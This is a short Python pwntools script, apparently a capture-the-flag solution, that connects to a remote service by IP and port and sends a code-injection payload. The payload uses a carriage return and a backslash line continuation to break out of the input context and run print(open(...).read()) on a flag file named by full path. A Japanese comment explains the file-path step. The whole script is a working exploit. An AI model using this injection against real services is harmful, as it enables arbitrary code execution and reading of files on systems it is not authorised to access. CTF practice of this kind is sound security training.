from pwn import *

context.log_level = 'debug'
HOST = '34.170.146.252'
PORT = 26254

io = remote(HOST, PORT)

# 見つけたファイル名をフルパスで指定して読み込みます
payload = b"\rprint(open('/flag-6930ec991884036e36717b01ff2b9363.txt').read()) or \\"

io.sendlineafter(b'> ', payload)
io.interactive()